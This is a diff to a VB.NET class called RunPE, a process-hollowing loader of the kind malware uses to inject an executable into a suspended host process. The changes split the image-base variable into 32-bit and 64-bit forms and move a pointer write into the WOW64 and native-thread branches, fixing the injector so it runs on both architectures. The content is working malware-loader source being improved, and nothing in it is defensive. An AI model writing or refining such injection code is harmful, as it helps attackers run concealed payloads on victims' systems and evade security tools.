@@ -21,7 +21,8 @@ Public Class RunPE
 
         Dim pImageBase32 As IntPtr
         Dim pImageBase64 As UIntPtr
-        Dim ImageBase As UInteger
+        Dim ImageBase32 As UInteger
+        Dim ImageBase64 As ULong
         Dim SizeOfImage As UInteger
         Dim SizeOfHeaders As UInteger
         Dim NumberOfSections As UShort
@@ -31,7 +32,7 @@ Public Class RunPE
         If machineUint = &H14C Then
             Dim ntHeaders32 As IMAGE_NT_HEADERS32 = Marshal.PtrToStructure(nt_header_ptr, GetType(IMAGE_NT_HEADERS32))
             pImageBase32 = New IntPtr(ntHeaders32.OptionalHeader.ImageBase)
-            ImageBase = ntHeaders32.OptionalHeader.ImageBase
+            ImageBase32 = ntHeaders32.OptionalHeader.ImageBase
             SizeOfImage = ntHeaders32.OptionalHeader.SizeOfImage
             SizeOfHeaders = ntHeaders32.OptionalHeader.SizeOfHeaders
             NumberOfSections = ntHeaders32.FileHeader.NumberOfSections
@@ -39,7 +40,7 @@ Public Class RunPE
         Else
             Dim ntHeaders64 As IMAGE_NT_HEADERS64 = Marshal.PtrToStructure(nt_header_ptr, GetType(IMAGE_NT_HEADERS64))
             pImageBase64 = New UIntPtr(ntHeaders64.OptionalHeader.ImageBase)
-            ImageBase = ntHeaders64.OptionalHeader.ImageBase
+            ImageBase64 = ntHeaders64.OptionalHeader.ImageBase
             SizeOfImage = ntHeaders64.OptionalHeader.SizeOfImage
             SizeOfHeaders = ntHeaders64.OptionalHeader.SizeOfHeaders
             NumberOfSections = ntHeaders64.FileHeader.NumberOfSections
@@ -82,8 +83,7 @@ Public Class RunPE
         End If
 
 
-        Dim ptr As IntPtr = Marshal.AllocHGlobal(8)
-        Marshal.WriteInt64(ptr, ImageBase)
+
 
         Dim context32 As New CONTEXT32()
         Dim context64 As New CONTEXT64()
@@ -91,6 +91,8 @@ Public Class RunPE
         Dim wow64Process As Boolean
         IsWow64Process(pi.hProcess, wow64Process)
         If wow64Process Then
+            Dim ptr As IntPtr = Marshal.AllocHGlobal(8)
+            Marshal.WriteInt64(ptr, ImageBase32)
             context32.ContextFlags = CONTEXT_FLAGS.CONTEXT_FULL
             If Not Wow64GetThreadContext32(pi.hThread, context32) Then
                 GoTo retexit
@@ -104,6 +106,8 @@ Public Class RunPE
                 GoTo retexit
             End If
         Else
+            Dim ptr As IntPtr = Marshal.AllocHGlobal(8)
+            Marshal.WriteInt64(ptr, ImageBase64)
             context64.ContextFlags = CONTEXT_FLAGS.CONTEXT_FULL
             If Not Wow64GetThreadContext64(pi.hThread, context64) Then
                 GoTo retexit
